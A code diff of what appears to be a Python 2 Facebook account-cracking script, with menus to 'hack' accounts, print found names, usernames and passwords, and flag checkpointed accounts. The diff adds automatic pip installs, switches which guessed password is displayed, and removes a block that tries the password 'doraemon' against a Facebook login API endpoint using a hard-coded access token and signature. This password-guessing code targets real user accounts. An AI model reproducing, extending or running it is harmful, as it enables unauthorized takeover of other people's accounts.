@@ -2,6 +2,15 @@
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+else:
+    try:
+        import requests
+    except ImportError:
+        os.system('pip2 install requests')
 
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -442,7 +451,7 @@ def mini():
                                                 print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                 menu_hack()
                                             else:
@@ -451,7 +460,7 @@ def mini():
                                                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                                     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                     menu_hack()
                                                 else:
@@ -695,15 +704,6 @@ def pilih_super():
                                                             else:
                                                                 if 'www.facebook.com' in q['error_msg']:
                                                                     print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5 + ' ==> ' + b['name']
-								else:
-								    pass6 = ('doraemon')
-               							    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-               							    q = json.load(data)
-               							    if 'access_token' in q:
-           							        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
-               							    else:
-                   						        if 'www.facebook.com' in q['error_msg']:
-                       							    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
 
         except:
             pass
